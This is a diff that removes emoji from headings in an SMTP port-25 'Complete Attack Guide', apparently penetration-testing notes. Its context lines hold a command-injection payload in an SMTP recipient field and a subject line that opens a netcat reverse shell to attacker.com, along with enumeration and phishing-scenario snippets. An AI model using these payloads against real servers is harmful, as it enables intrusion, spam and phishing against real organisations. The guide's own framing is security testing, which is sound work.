@@ -1,6 +1,6 @@
 # Port 25 - SMTP (Simple Mail Transfer Protocol) - Complete Attack Guide
 
-## 📖 Overview
+## Overview
 
 **Protocol**: SMTP (Simple Mail Transfer Protocol)
 **Port**: 25 (SMTP), 465 (SMTPS), 587 (Submission)
@@ -8,7 +8,7 @@
 **Encryption**: Optional (STARTTLS on 587, SSL on 465)
 **Authentication**: Optional (PLAIN, LOGIN, CRAM-MD5)
 
-## 🎯 Attack Objectives
+## Attack Objectives
 
 - **User Enumeration**: Discover valid email addresses
 - **Open Relay Testing**: Find misconfigured mail servers
@@ -17,7 +17,7 @@
 - **Spam/Phishing**: Use server for malicious emails
 - **Information Gathering**: Extract server details
 
-## 🔍 Attack Methodology
+## Attack Methodology
 
 ### Phase 1: Discovery and Reconnaissance
 
@@ -363,7 +363,7 @@ RCPT TO:<`whoami`@target.com>
 Subject: test$(nc attacker.com 4444 -e /bin/bash)
 ```
 
-## 🛡️ Bypass Techniques
+## Bypass Techniques
 
 ### Bypassing Blacklists
 ```bash
@@ -396,7 +396,7 @@ for user in $(cat users.txt); do
 done
 ```
 
-## 📊 Information Extraction
+## Information Extraction
 
 **Key Information to Gather**:
 ```bash
@@ -419,7 +419,7 @@ AUTH capabilities
 HELO/EHLO reveals internal hostnames
 ```
 
-## 🔐 Security Recommendations
+## Security Recommendations
 
 **For Defenders**:
 1. **Disable VRFY/EXPN** - Prevent user enumeration
@@ -433,7 +433,7 @@ HELO/EHLO reveals internal hostnames
 9. **Reverse DNS** - Check sender validity
 10. **Content Filtering** - Scan for malicious content
 
-## ⚠️ Common Mistakes
+## Common Mistakes
 
 **Attacker Mistakes**:
 1. Too many VRFY attempts - Detection
@@ -448,7 +448,7 @@ HELO/EHLO reveals internal hostnames
 4. Weak authentication - Brute force success
 5. No TLS enforcement - Credential sniffing
 
-## 🎯 Practical Attack Scenario
+## Practical Attack Scenario
 
 ```bash
 # Phase 1: Discovery
@@ -474,7 +474,7 @@ swaks --to sales@target.com \
 # Wait for victim to reply or act on email
 ```
 
-## 📚 Tools Summary
+## Tools Summary
 
 **Best Tool for Each Task**:
 - **User Enumeration**: smtp-user-enum
@@ -484,7 +484,7 @@ swaks --to sales@target.com \
 - **Sniffing**: Wireshark, tcpdump
 - **Testing**: swaks (Swiss Army Knife)
 
-## 🔗 Related Attacks
+## Related Attacks
 
 - **Port 110/143 (POP3/IMAP)**: Same credentials often work
 - **Port 80/443**: Webmail uses same accounts
